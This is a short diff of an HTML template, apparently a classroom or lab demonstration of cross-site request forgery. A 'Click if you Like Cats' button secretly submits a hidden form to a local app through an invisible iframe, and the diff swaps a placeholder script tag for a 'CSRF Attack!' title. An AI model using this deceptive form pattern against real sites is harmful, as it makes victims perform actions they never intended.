@@ -3,8 +3,8 @@
 {% block content %}
   <iframe name="hidden-frame" style="display:none"></iframe>
   <form method="POST" action="http://localhost:36301/post" target="hidden-frame">
-    <input type="hidden" name="title" value="">
-    <input type="hidden" name="content" value="<script>This was posted by the evil page!</script>">
+    <input type="hidden" name="title" value="CSRF Attack!">
+    <input type="hidden" name="content" value="This was posted by the Evil Page">
     <img src="/static/images/cat.jpg" alt="Cat" class="img-fluid w-50">
     <button type="submit" class="btn btn-primary">Click if you Like Cats</button>
   </form>
